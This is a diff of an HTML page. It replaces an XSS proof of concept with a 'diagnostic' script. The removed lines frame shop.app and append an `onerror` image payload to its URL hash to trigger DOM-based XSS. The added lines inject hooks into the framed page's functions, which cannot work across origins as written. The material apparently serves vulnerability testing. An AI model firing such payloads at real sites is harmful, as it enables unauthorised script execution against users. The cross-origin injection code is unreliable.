@@ -1,48 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Demo</title>
-    <style>
-        #victimFrame { 
-            width: 100%; 
-            height: 500px; 
-            border: 2px solid red; /* Makes it easy to see */
-            margin-bottom: 10px;
-        }
-        #triggerButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
+    <title>XSS Diagnostic Tool</title>
+    <style>#victimFrame { width: 100%; height: 500px; border: 2px solid red; }</style>
 </head>
 <body>
-    <h2>1. The target site is loaded below:</h2>
+    <h2>Diagnostic Tool</h2>
+    <button onclick="startDiagnostics()">Start Diagnostics</button>
     <iframe id="victimFrame" src="https://shop.app/"></iframe>
-    
-    <br>
-    <h2>2. Click the button to simulate a user clicking a malicious link on this site:</h2>
-    <button id="triggerButton" onclick="triggerExploit()">Add Malicious Hash</button>
-
     <script>
-        // The malicious payload you want to add to the URL
-        const maliciousHash = "#<img src=x onerror='alert(\"XSS: \" + document.domain)'>";
-
-        function triggerExploit() {
+        function startDiagnostics() {
             const frame = document.getElementById('victimFrame');
-            
-            // Get the current URL of the iframe
-            let currentUrl = frame.src;
-            
-            // Construct the new URL by appending the malicious hash
-            // This uses the DOM's built-in URL handling to do it cleanly
-            let newUrl = new URL(currentUrl);
-            newUrl.hash = maliciousHash; // This correctly handles encoding
+            const frameWindow = frame.contentWindow;
+            const frameDoc = frame.contentDocument;
 
-            // Navigate the iframe to the new URL
-            frame.src = newUrl.toString();
-            
-            console.log("Attempting to navigate to:", newUrl.toString());
+            // Inject a script into the iframe to set up listeners
+            const script = frameDoc.createElement('script');
+            script.textContent = `
+                // Log all hash changes
+                window.addEventListener('hashchange', function(event) {
+                    console.log('[DIAG] Hashchange event fired!', event.oldURL, ' -> ', event.newURL);
+                });
+
+                // Hook the specific Bt() function to see if it's called and what it returns
+                // First, check if Bt exists and is a function
+                if (typeof Bt === 'function') {
+                    console.log('[DIAG] Bt() function is present. Original function:', Bt);
+                    // Store the original function
+                    const originalBt = Bt;
+                    // Override it to add logging
+                    Bt = function(o, u) {
+                        console.log('[DIAG] Bt() was called with input:', o);
+                        const result = originalBt(o, u);
+                        console.log('[DIAG] Bt() returned:', result);
+                        return result;
+                    };
+                } else {
+                    console.log('[DIAG] Bt() function NOT found on this page.');
+                }
+
+                // Hook the leaveBreadcrumb function too
+                if (typeof d !== 'undefined' && d && typeof d.leaveBreadcrumb === 'function') {
+                    console.log('[DIAG] d.leaveBreadcrumb() is present.');
+                    const originalLeave = d.leaveBreadcrumb;
+                    d.leaveBreadcrumb = function() {
+                        console.log('[DIAG] leaveBreadcrumb() called with args:', arguments);
+                        return originalLeave.apply(this, arguments);
+                    };
+                }
+            `;
+            (frameDoc.head || frameDoc.documentElement).appendChild(script);
+            console.log("Diagnostics injected.");
         }
     </script>
 </body>
